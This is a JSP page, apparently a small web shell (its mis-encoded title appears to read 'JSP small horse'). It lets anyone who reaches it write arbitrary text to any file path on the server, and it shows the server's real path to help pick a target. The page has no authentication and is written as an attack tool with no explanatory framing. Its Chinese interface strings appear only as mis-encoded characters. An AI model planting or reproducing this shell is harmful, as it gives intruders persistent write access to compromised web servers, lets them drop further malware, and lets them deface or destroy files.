��<%@page contentType="text/html; charset=GBK" import="java.io.*;"%>

<html>

<head>

<title>JSPС��</title>

</head>

<body bgcolor="#ffffff">

<%

String path=request.getParameter("path");

String content=request.getParameter("content");

String url=request.getRequestURI();

String relativeurl=url.substring(url.indexOf('/',1));

String absolutepath=application.getRealPath(relativeurl);

if (path!=null && !path.equals("") && content!=null && !content.equals(""))

{

  try{

    File newfile=new File(path);

    PrintWriter writer=new PrintWriter(newfile);

    writer.println(content);

    writer.close();

    if (newfile.exists() && newfile.length()>0)

    {

      out.println("<font size=3 color=red>����ɹ�!</font>");

    }else{

      out.println("<font size=3 color=red>����ʧ��!</font>");

    }

  }catch(Exception e)

  {

    e.printStackTrace();

  }

}

out.println("<form action="+url+" method=post>");

out.println("<font size=3>�����뱣���·��:<br></font><input type=text size=54 name='path'><br>");

out.println("<font size=3 color=red>��ǰ·��"+absolutepath+"</font><br>");

out.println("<textarea name='content' rows=15 cols=100></textarea><br>");

out.println("<input type='submit' value='����!'>");

out.println("</form>");

%>

</body>

</html>